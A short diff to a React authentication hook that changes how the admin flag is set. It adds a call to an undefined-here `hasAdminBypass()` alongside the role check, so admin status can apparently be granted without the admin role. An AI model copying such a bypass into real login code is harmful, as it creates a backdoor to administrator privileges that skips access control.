@@ -29,7 +29,7 @@ export function useAuth() {
       supabase.from("user_roles").select("role").eq("user_id", uid),
     ]);
     setProfile(p as Profile | null);
-    setIsAdmin(!!roles?.some((r) => r.role === "admin"));
+    setIsAdmin(!!roles?.some((r) => r.role === "admin") || hasAdminBypass());
   }, []);
 
   useEffect(() => {
